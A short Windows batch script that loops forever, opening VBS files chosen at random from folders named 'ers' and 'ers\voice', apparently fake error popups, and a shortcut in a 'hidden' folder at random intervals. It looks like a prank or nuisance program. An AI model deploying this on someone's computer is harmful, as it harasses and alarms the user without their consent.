@echo off

start %cd%\other\bgn.vbs
timeout 5 > nul

:main
set /a vs=%random% %%15
set /a tm=%random% %%8

if %vs%==0 start %cd%\ers\er1.vbs
if %vs%==1 start %cd%\ers\er2.vbs
if %vs%==2 start %cd%\ers\er3.vbs
if %vs%==3 start %cd%\ers\er4.vbs
if %vs%==4 start %cd%\ers\er5.vbs
if %vs%==5 start %cd%\ers\voice\er1.vbs
if %vs%==6 start %cd%\ers\voice\er2.vbs

timeout %tm% > nul

start %cd%\hidden\main.hidden.lnk

goto main